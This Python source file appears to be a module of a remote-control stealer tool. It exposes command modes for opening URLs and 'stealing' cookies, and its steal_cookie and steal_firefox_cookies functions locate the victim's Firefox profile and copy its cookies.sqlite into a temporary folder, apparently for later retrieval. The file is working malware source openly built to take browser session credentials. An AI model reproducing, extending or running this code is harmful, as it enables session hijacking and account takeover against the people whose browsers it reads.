import os
import webbrowser
import json
import sqlite3
import shutil
from datetime import datetime
import config
import hashlib
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2
import base64
import constants


def open_url(url):
    try:
        webbrowser.open(url)
        return (0, 1)
    except Exception as ex:
        return (1, str(ex))


def steal_cookie():
    cookie_paths = {}

    browsers = get_browsers()

    if 'Firefox' in browsers:
        try:
            cookie_paths['Firefox'] = steal_firefox_cookies()
        except Exception as ex:
            cookie_paths['Firefox'] = (1, 'Error file is busy by browser.')

    return cookie_paths


def get_firefox_profile():
    firefox_path = config.home_path + '.mozilla/firefox/'
    profiles = []
    if os.path.isdir(firefox_path):
        for dirname in os.listdir(firefox_path):
            if dirname.endswith('.default-esr') or dirname.endswith('.default-release'):
                profile_path = firefox_path + dirname
                if os.path.isdir(profile_path):
                    profiles.append(profile_path)
    return profiles[0] if profiles else None


def steal_firefox_cookies():
    tmp_cookie_firefox_path = config.tmp_dir_path + 'Firefox cookie.sqlite'
    profile_path = get_firefox_profile()
    if not profile_path:
        return (1, "Firefox profile not found")

    src_cookies = os.path.join(profile_path, 'cookies.sqlite')
    try:
        shutil.copy2(src_cookies, tmp_cookie_firefox_path)
        return (0, tmp_cookie_firefox_path)
    except Exception as ex:
        return (1, f"Error copying cookies: {str(ex)}")


def delete_tmp_cookies():
    tmp_cookie_firefox_path = config.tmp_dir_path + 'Firefox cookie.sqlite'
    if os.path.isfile(tmp_cookie_firefox_path):
        os.remove(tmp_cookie_firefox_path)


def get_browsers():
    browsers = []
    if get_firefox_profile():
        browsers.append("Firefox")
    return browsers


modes = {constants.BROWSER_OPENURL_preview: constants.BROWSER_OPENURL,
         constants.BROWSER_STEALCOOKIE_preview: constants.BROWSER_STEALCOOKIE}
